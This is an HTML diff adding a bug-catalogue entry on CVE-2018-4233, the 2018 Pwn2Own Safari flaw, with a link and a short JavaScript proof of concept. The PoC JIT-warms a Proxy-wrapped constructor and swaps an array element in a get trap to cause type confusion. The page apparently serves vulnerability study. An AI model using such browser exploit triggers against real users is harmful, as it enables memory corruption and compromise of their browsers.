@@ -16,7 +16,35 @@
             <li><a href="reading.html">Paper Reading</a></li>
             <li><a class="active" href="#">Bug Analysis</a></li>
         </ul>
+        <p>9. [CVE-2018-4233] 2018 Pwn2Own Safari<br>
+            &nbsp;&nbsp; Finder: Samuel Groß<br>
+            &nbsp;&nbsp; <a href="https://github.com/saelo/cve-2018-4233">https://github.com/saelo/cve-2018-4233</a><br>
+            <pre><code>function Constructor(a, v){
+    a[0] = v;
+}
 
+var trigger = false;
+var arg = null;
+var handler = {
+    get(target, propname) {
+        if(trigger) {
+            arg[0] = {};
+        }
+        return target[propname];
+    },
+};
+var EvilProxy = new Proxy(Constructor, handler);
+
+for(var i = 0; i < 100000; i++) {
+    new EvilProxy([1.1, 2.2, 3.3], 13.37);
+}
+
+trigger = true;
+arg = [1.1, 2.2, 3.3];
+new EvilProxy(arg, 3.54484805889626e-310);
+arg[0];</code></pre>
+        </p>
+        <br>
         <p>8. Anonymous bug<br>
             &nbsp;&nbsp; Finder: Zhenhuan Li<br>
             &nbsp;&nbsp; <a href="https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf">https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Li-Using-the-JIT-Vulnerability-to-Pwning-Microsoft-Edge.pdf</a><br>
